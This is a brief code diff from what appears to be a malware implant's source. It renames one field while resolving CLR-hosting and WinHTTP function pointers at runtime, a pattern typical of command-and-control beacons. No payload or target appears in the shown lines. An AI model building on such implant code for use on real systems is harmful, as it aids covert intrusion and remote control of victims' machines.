@@ -65,7 +65,7 @@ namespace Implant {
         }
 
         if (
-            !(F_PTR_HMOD(Ctx->CLR.CLRCreateInstance,              Ctx->modules.mscoree, CLRCREATEINSTANCE)) ||
+            !(F_PTR_HMOD(Ctx->clr.CLRCreateInstance,              Ctx->modules.mscoree, CLRCREATEINSTANCE)) ||
             !(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                  Ctx->modules.winhttp, WINHTTPOPEN)) ||
             !(F_PTR_HMOD(Ctx->win32.WinHttpConnect,               Ctx->modules.winhttp, WINHTTPCONNECT)) ||
             !(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,           Ctx->modules.winhttp, WINHTTPOPENREQUEST)) ||
